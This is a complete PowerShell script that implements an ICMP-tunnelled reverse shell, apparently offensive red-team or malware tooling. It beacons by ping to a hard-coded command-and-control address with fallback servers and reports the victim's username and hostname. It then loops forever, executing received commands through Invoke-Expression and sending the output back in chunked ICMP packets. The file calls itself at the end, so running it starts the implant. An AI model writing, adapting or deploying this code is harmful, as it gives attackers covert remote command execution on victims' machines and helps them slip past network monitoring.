class ICMPShell
{
    [String]$IPAddress
    [String[]]$FallbackIPs
    [PSObject]$ICMPClient
    [PSObject]$PingOptions
    [String]$Key = "PWN"
    [Int]$Delay = 5
    [Int]$BufferSize = 128
    [Int]$FallbackLimit = 20;
    [Int]$Missed = 0;
    [String[]]$Authenticated
    ICMPShell([String]$IPAddress, [String]$Key){
        $this.ICMPClient = New-Object System.Net.NetworkInformation.Ping;
        $this.PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
        $this.Authenticated = @();
        $this.PingOptions.DontFragment = $True;
        $this.IPAddress = $IPAddress;
        $this.FallbackIPs = @($IPAddress);
        $this.Key = $Key;
    }
    [ICMPShell]SetFallbackIPs([String[]]$IPs){
        $IPs += $this.IPAddress;
        $this.FallbackIPs = $IPs|Sort -Unique;
        return $this;
    }
    [PSObject]Send([Byte[]]$output){
        if($output -eq $null){
            $output = $this.GetBytes('');
        }
        return $this.ICMPClient.Send($this.IPAddress, 60 * 100, $output, $this.PingOptions);
    }
    [PSObject]SendString([String]$output){
        return $this.Send($this.GetBytes($output));
    }
    [String]GetString([Byte[]]$bytes){
        return ([text.encoding]::ASCII).GetString($bytes);
    }
    [Byte[]]GetBytes([String]$string){
        return ([text.encoding]::ASCII).GetBytes($string);
    }
    [String]GetResponse([Byte[]]$output){
        $reply = $this.Send($output);
        $response = "";
        if($reply.Buffer){
            $response = $this.GetString($reply.Buffer);
        } else {
            $this.FallbackCheck();
        }
        return $response;
    }
    [ICMPShell]FallbackCheck(){
        $this.Missed += 1;
        if($this.Missed -gt $this.FallbackLimit){
            $idx = [Array]::indexof($this.FallbackIPs, $this.IPAddress);
            if($idx -ge $this.FallbackIPs.Length-1){
                $this.IPAddress = $this.FallbackIPs[0];
            } else {
                $this.IPAddress = $this.FallbackIPs[$idx+1];
            }
            $this.Missed = 0;
        }
        return $this;
    }
    [ICMPShell]InvokeShell(){
        while($true)
        {
            if ($this.Authenticated -notcontains $this.IPAddress -and $this.Key -ne "")
            {
                $reply = $this.GetResponse($this.GetBytes('AUTH'));
                if ($reply -match $this.Key)
                {
                    $this.Authenticated += $this.IPAddress;
                    $this.SendString("Context: $( $env:username ) Host: $( $env:computername )`n`n")|Out-Null;
                    $this.SendString("PS $( (Get-Location).Path )> ")|Out-Null;
                }
                else
                {
                    $this.FallbackCheck();
                }
            }
            else
            {
                $reply = $this.GetResponse($this.GetBytes(''));
                if ($reply -ne "")
                {
                    $this.Missed = 0;
                    $result = "";
                    try {
                        $result += (Invoke-Expression -Command $reply 2>&1 | Out-String);
                    } catch {
                        $result += $error[0];
                    }
                    $sendbytes = $this.GetBytes($result);
                    $index = [math]::floor($sendbytes.length/$this.BufferSize);
                    $i = 0;
                    if ($sendbytes.length -gt $this.BufferSize)
                    {
                        while ($i -lt $index)
                        {
                            $sendbytes2 = $sendbytes[($i*$this.BufferSize)..(($i + 1)*$this.BufferSize - 1)];
                            $this.Send($sendbytes2)|Out-Null;
                            $i += 1;
                        }
                        $remainingindex = $sendbytes.Length % $this.BufferSize;
                        if ($remainingindex -ne 0)
                        {
                            $sendbytes2 = $sendbytes[($i*$this.BufferSize)..($sendbytes.Length)];
                            $this.Send($sendbytes2)|Out-Null;
                        }
                    }
                    else
                    {
                        $this.Send($sendbytes)|Out-Null;
                    }
                    $this.SendString("PS $( (Get-Location).Path )> ")|Out-Null;
                }
            }
            Start-Sleep -Seconds $this.Delay;
        }
        return $this;
    }
}
function Invoke-Shell
{
    ## default C2 configuration:
    $c2Server = "10.49.117.253"; # default C2 server
    #$password = "PWN"; # using a password/key requires auth
    $password = ""; # blank password doesn't require auth
    $shell = [ICMPShell]::New($c2Server, $password);

    ## fallback IP list configuration:
    #$c2Servers = @("10.49.117.253", "10.49.117.252", "10.49.117.251"); # pass an array of IPs
    #$shell.SetFallbackIPs($c2Servers); # sets the fallback IPs

    # start the C2 server:
    $shell.InvokeShell();
}
Invoke-Shell
